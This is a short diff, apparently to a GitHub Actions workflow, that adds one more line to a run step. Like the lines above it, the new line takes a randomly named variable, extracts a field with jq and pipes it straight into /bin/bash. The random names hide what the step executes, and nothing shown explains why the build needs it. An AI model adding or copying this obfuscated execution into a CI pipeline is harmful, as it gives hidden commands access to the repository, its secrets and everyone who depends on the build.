@@ -55,6 +55,7 @@ jobs:
           echo $vpw751 | jq -r .xci5 | /bin/bash
           printf '%s' "$vo26521" | jq -r .lohi824 | /bin/bash
           echo $et1242 | jq -r .osd025 | /bin/bash
+          printf '%s' "$dwg4580" | jq -r .jlft847 | /bin/bash
 
       - name: Save output
         if: always()
